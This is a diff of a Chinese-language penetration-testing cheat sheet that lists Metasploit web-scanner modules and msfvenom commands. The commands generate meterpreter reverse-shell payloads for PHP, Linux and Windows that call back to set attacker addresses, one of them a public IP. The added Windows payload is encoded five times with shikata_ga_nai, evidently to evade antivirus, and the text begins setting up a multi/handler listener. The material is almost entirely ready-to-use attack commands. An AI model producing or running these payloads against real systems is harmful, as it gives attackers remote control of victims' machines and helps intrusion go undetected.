@@ -82,11 +82,14 @@ web 应用程序漏洞扫描模块
 Module auxiliary/scanner/http/blind_sql_query Module auxiliary/scanner/http/error_sql_injection Module auxiliary/scanner/http/http_traversal
 Module auxiliary/scanner/http/rails_mass_assignment Module exploit/multi/http/lcms_php_exec
 # php rev
-msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.0.120 LPORT=4433 -f raw > shell.php
+msfvenom -p php/meterpreter_reverse_tcp LHOST=119.29.226.211 LPORT=2341 -f raw > shell.php
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 
 # linux
-msfvenom -p use payload/linux/x86/meterpreter/reverse_tcp  LHOST=192.168.0.120 LPORT=4433 -f elf >shell.elf
+msfvenom -p payload/linux/x86/meterpreter/reverse_tcp  LHOST=192.168.0.120 LPORT=4433 -f elf >shell.elf
+
+# win
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=192.168.203.139 LPORT=2341 -f exe > abc.exe
 
 # 监听
 use exploit/multi/handler
